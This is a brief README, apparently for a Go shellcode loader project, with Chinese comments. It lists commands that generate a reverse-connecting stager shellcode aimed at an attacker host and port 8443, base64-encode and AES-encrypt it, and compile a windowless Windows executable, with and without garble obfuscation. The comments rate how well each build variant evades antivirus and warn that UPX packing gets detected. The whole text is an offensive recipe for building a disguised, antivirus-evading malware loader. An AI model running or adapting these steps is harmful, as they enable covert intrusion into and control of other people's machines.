# goShellCode

//生成shellcode

generate stager --lhost HOST --lport 8443 --arch amd64 --format raw --save ./raw_shellcode
base64 -w 0 -i raw_shellcode > stager.bs64
go run aes.go

//免杀效果拉跨

garble -literals -tiny -seed=random build -ldflags="-w -s -H windowsgui" ./main.go

//免杀效果好 

go build -ldflags="-w -s -H windowsgui" ./main.go

//压缩,upx压缩之后容易被查杀

upx.exe -9 -q -o zip.exe main.exe


## build.bat
